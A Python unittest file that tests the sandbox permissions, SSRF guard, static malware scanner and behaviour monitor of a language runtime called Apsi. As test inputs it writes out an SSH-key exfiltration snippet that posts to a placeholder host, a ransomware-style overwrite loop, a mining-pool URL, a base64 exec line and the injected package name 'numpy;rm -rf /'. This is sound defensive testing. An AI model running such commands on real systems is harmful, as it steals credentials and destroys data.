"""Security regression tests: scoped permissions, guarded locations, SSRF guard, Apsi Guard
static scanner, behaviour monitor, Python/native-code controls and package-name safety."""
import os
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from apsi.interpreter import Interpreter          # noqa: E402
from apsi.parser import parse                     # noqa: E402
from apsi.security import Policy, PermissionErr, check_path, resolve_checked, ALL  # noqa: E402
from apsi import guard                            # noqa: E402


def run(src, policy, folder):
    it = Interpreter(policy=policy)
    path = os.path.join(folder, "prog.apsi")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(src)
    return it.run(src, path)


def cli(*args, cwd=None, env=None):
    e = dict(os.environ, PYTHONPATH=ROOT, **(env or {}))
    return subprocess.run([sys.executable, "-m", "apsi", *args], cwd=cwd, env=e, capture_output=True, text=True)


class Permissions(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.home = tempfile.mkdtemp()
        os.environ["APSI_HOME"] = os.path.join(self.home, ".apsi")

    def tearDown(self):
        os.environ.pop("APSI_HOME", None)

    def test_sandbox_denies_files(self):
        with self.assertRaises(PermissionErr):
            run('write_text("a.txt", "x")', Policy.profile("sandbox"), self.tmp)

    def test_strict_confines_to_program_folder(self):
        pol = Policy.profile("strict", self.tmp)
        run('write_text("ok.txt", "x")', pol, self.tmp)
        self.assertTrue(os.path.exists(os.path.join(self.tmp, "ok.txt")))
        with self.assertRaises(PermissionErr):
            run('write_text("../escape.txt", "x")', pol, self.tmp)

    def test_symlink_cannot_escape_scope(self):
        outside = tempfile.mkdtemp()
        with open(os.path.join(outside, "secret.txt"), "w") as fh:
            fh.write("s")
        try:
            os.symlink(outside, os.path.join(self.tmp, "link"))
        except OSError:
            self.skipTest("creating symlinks needs Developer Mode or admin rights on Windows")
        with self.assertRaises(PermissionErr):
            run('print(read_text("link/secret.txt"))', Policy.profile("strict", self.tmp), self.tmp)

    def test_config_is_never_writable(self):
        target = os.path.join(os.environ["APSI_HOME"], "config.json").replace("\\", "/")
        with self.assertRaises(PermissionErr):
            run(f'write_text("{str(target).replace(chr(92), "/")}", "{{}}")', Policy.profile("developer"), self.tmp)

    def test_credentials_need_explicit_grant(self):
        ssh = os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa").replace("\\", "/")
        with self.assertRaises(PermissionErr) as cm:
            check_path(type("I", (), {"policy": Policy.profile("standard"), "dir_stack": [self.tmp]})(), ssh, "read")
        self.assertIn("credentials", str(cm.exception))

    def test_nul_byte_rejected(self):
        it = type("I", (), {"policy": Policy.profile("standard"), "dir_stack": [self.tmp]})()
        with self.assertRaises(PermissionErr):
            check_path(it, "a\x00b", "read")

    def test_metadata_endpoint_blocked_for_wildcard_net(self):
        pol = Policy.profile("standard")
        pol.net = ALL
        it = type("I", (), {"policy": pol})()
        with self.assertRaises(PermissionErr):
            resolve_checked(it, "169.254.169.254", 80)

    def test_python_escape_modules_need_all(self):
        pol = Policy.profile("standard")
        pol.python = "safe"
        with self.assertRaises(PermissionErr):
            run('let o = pyimport("subprocess")', pol, self.tmp)
        run('let j = pyimport("json")', pol, self.tmp)
        pol.python = "all"
        run('let o = pyimport("os")', pol, self.tmp)


class Scanner(unittest.TestCase):
    def scan(self, src):
        return {f.rule for f in guard.scan_program(parse(src), src)}

    def test_exfiltration(self):
        r = self.scan('let k = read_text("/home/u/.ssh/id_rsa")\nhttp_post_json("https://x.example/", {"k": k})\n')
        self.assertIn("exfiltration", r)

    def test_trojan_source(self):
        self.assertIn("trojan-source", self.scan('print("a ‮ b")\n'))

    def test_homoglyph_but_not_physics_greek(self):
        self.assertIn("homoglyph", self.scan("let pаss = 1\n"))
        self.assertEqual(set(), self.scan("let ωt = 1.0\nlet πx = 2.0\n"))

    def test_ransomware_shape(self):
        src = 'for f in from_files("d"):\n    write_text(f, aes_encrypt(read_text(f), "k"))\n'
        self.assertIn("ransomware-pattern", self.scan(src))

    def test_miner_and_escape(self):
        r = self.scan('print("stratum+tcp://p:1")\nlet s = pyimport("subprocess")\nlet m = pyimport("o" + "s")\n')
        self.assertTrue({"suspicious-endpoint", "sandbox-escape", "dynamic-import"} <= r)

    def test_prose_and_lookalike_names_are_not_credentials(self):
        doc = 'let d = """A downloader.\nPut GITHUB_TOKEN in .env; it never reads credentials or cookies.\n"""\n'
        self.assertEqual(set(), self.scan(doc + 'let r = ["netdata/netdata", "the metadata"]\n'))
        self.assertIn("credential-access", self.scan('let t = "C:/Users/u/AppData/Roaming/Telegram Desktop/tdata"\n'))
        found = guard.scan_program(parse('let e = [".env", ".env", ".env"]\n'), "")
        self.assertEqual(1, len([f for f in found if f.rule == "credential-access"]))     # one finding per line

    def test_examples_have_no_high_findings(self):
        res, _ = guard.scan_paths([os.path.join(ROOT, "examples")])
        bad = [(f, x) for f, _, fs in res for x in fs if guard.SEVERITY[x.severity] >= 3]
        self.assertEqual(bad, [])

    def test_python_companion_and_eicar(self):
        d = tempfile.mkdtemp()
        with open(os.path.join(d, "h.py"), "w") as fh:
            fh.write("import base64\nexec(base64.b64decode('eA=='))\n")
        with open(os.path.join(d, "e.txt"), "wb") as fh:
            fh.write(guard.EICAR)
        res, _ = guard.scan_paths([os.path.join(d, "h.py"), os.path.join(d, "e.txt")])
        rules = {x.rule for _, _, fs in res for x in fs}
        self.assertIn("eicar", rules)
        self.assertTrue(any(r.startswith("python-") for r in rules))


class Runtime(unittest.TestCase):
    def test_behaviour_monitor_stops_mass_overwrite(self):
        d = tempfile.mkdtemp()
        for i in range(30):
            with open(os.path.join(d, f"f{i}.txt"), "w") as fh:
                fh.write("x")
        src = 'for i in 0..30:\n    write_text(f"f{i}.txt", "gone")\n'
        with open(os.path.join(d, "w.apsi"), "w") as fh:
            fh.write(src)
        r = cli("run", "w.apsi", "--trust", cwd=d, env={"APSI_GUARD_MAX_OVERWRITES": "10"})
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("Apsi Guard stopped", r.stderr + r.stdout)
        intact = 0
        for i in range(30):
            with open(os.path.join(d, f"f{i}.txt"), encoding="utf-8") as fh:
                intact += fh.read() == "x"
        self.assertGreaterEqual(intact, 19)

    def test_run_gate_blocks_critical(self):
        d = tempfile.mkdtemp()
        with open(os.path.join(d, "m.apsi"), "w", encoding="utf-8") as fh:
            fh.write('print("stratum+tcp://pool:3333")\n')
        r = cli("run", "m.apsi", cwd=d)
        self.assertEqual(r.returncode, 3)
        self.assertIn("blocked", r.stderr)
        self.assertEqual(cli("run", "m.apsi", "--trust", cwd=d).returncode, 0)

    def test_native_from_temp_refused(self):
        lib = os.path.join(tempfile.gettempdir(), "evil_test_lib.so")
        with open(lib, "wb") as fh:
            fh.write(b"\x7fELF")
        pol = Policy.profile("developer")
        with self.assertRaises(PermissionErr):
            guard.check_native(pol, lib)

    def test_ffi_pin_mismatch(self):
        d = tempfile.mkdtemp(dir=os.path.expanduser("~"))
        lib = os.path.join(d, "lib.so")
        with open(lib, "wb") as fh:
            fh.write(b"data")
        pol = Policy.profile("developer")
        pol.ffi_pins = {"lib.so": "0" * 64}
        with self.assertRaises(PermissionErr):
            guard.check_native(pol, lib)
        import hashlib
        pol.ffi_pins = {"lib.so": hashlib.sha256(b"data").hexdigest()}
        guard.check_native(pol, lib)

    def test_pkg_refuses_injection(self):
        r = cli("pkg", "install", "numpy;rm -rf /")
        self.assertNotEqual(r.returncode, 0)


if __name__ == "__main__":
    unittest.main()
